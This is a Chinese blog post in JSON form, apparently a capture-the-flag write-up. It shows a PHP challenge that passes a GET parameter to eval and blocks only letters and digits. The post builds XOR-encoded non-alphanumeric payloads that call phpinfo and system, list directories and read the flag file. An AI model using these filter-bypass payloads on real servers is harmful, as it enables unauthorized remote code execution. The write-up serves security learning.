{"title":"无字母数字RCE","uid":"be2622c109e5481786c1d7440a312fa3","slug":"无字母数字RCE","date":"2023-01-14T01:04:37.000Z","updated":"2023-01-14T01:29:40.439Z","comments":true,"path":"api/articles/无字母数字RCE.json","keywords":null,"cover":[],"content":"<p>题目：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;code&#39;]))&#123;\n        $code&#x3D;$_GET[&#39;code&#39;];         \n        if(preg_match(&quot;&#x2F;[a-z0-9]&#x2F;is&quot;,$code))&#123;\n            die(&quot;NO.&quot;);\n        &#125;\n        @eval($code);\n&#125;\nelse&#123;\n        highlight_file(__FILE__);\n&#125;\n?&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>无字母数字进行RCE</p>\n<p>eval函数中的内容会被视为php代码进行执行，只要令code的内容为需要进行的操作可以利用除字母数字以外的字符（ASCII码1~256中的字符）进行运算操作而凑出想要的字符，可以让code的值为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>采用url编码异或的方式得到%0c%08”^”%60%7b &#x2F;&#x2F;ls</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%22%0c%08&quot;^&quot;%60%7b%22);&amp;%ff&#x3D;system<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>即</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;_GET&#125;&#123;%ff&#125;(&quot;ls&quot;);&amp;%ff&#x3D;system<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>执行结果</p>\n<p><img src=\"/.%5C%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE%5C2.png\"></p>\n<p>查看上一层中的文件</p>\n<p><img src=\"/.%5C%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE%5C1.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">%0c%08%01%00&quot;^&quot;%60%7b%21%2f &#x2F;&#x2F;ls &#x2F;\n\n%03%01%09%01%00%06%06%06%06%0c%0c%0c%0c%01%01%01%01%07%07%07%07&quot;^&quot;%60%60%7d%21%2f%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60 &#x2F;&#x2F; cat &#x2F;ffffllllaaaagggg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n","text":"题目： &lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(preg_match(&quot;&#x2F;[a-z0-9]...","link":"","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SSTI的理解","uid":"a02765d3f17045091b7948695d0675cc","slug":"SSTI的理解","date":"2023-01-14T01:31:42.000Z","updated":"2023-01-14T01:48:48.310Z","comments":true,"path":"api/articles/SSTI的理解.json","keywords":null,"cover":[],"text":"SSTI的理解： SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。 SSTI引发的真正原因：render_template渲染函数的问题 render_template渲染函数是什么：就是把HTML涉及的页面与用户数据分离开，这样方便展...","link":"","photos":[],"count_time":{"symbolsCount":473,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}